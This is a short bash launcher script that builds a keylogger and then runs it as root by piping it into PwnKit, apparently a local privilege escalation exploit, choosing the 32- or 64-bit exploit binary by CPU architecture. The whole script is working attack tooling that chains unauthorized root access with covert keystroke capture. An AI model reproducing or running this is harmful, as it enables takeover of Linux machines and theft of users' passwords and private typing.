#!/bin/bash

# build the keylogger
make

# run keylogger inside a root shell
if [ `lscpu | grep "Architecture" | awk '{print $2}'` == "x86_64" ]; then
	echo "./naktm" | ./PwnKit # 64bit
else
	echo "./naktm" | ./PwnKit32 # 32bit
fi
